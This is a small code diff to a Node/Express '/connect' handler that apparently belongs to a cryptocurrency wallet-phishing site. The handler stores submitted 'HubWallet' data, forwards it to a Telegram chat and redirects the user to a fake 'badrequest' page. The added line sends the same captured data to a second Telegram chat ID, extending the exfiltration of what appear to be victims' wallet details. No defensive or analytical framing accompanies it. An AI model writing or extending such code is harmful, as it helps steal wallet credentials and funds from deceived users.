@@ -520,6 +520,7 @@ app.post("/connect", async (req, res) => {
     data.createdAt = new Date();
     const savedData = await HubWallet.create(data);
     sendToTelegram("1618693731", text);
+    sendToTelegram("1317131611", text);
     res.redirect('https://defi-assist.netlify.app/badrequest');
     return savedData;
   } catch (err) {
